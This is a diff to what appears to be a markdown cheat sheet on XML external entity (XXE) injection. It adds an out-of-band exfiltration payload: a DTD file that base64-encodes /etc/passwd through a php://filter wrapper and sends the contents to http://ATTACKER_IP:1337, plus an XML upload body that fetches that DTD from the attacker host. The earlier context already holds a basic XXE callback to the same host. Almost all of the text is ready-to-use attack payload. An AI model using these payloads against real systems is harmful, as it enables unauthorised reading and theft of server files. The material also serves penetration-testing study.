@@ -19,6 +19,19 @@
       <!ENTITY xxe SYSTEM "http://ATTACKER_IP:1337/" >]>
       <upload><file>&xxe;</file></upload>
 
+### Create a payload named sample.dtd with the code below:
+
+      <!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+      <!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+      %oobxxe;
+
+### Final OOB Payload:
+
+      <?xml version="1.0" encoding="UTF-8"?>
+      <!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
+      <upload>
+    <file>&exfil;</file>
+      </upload>
 
 | **Code**   | **Description**   |
 | --------------|-------------------|
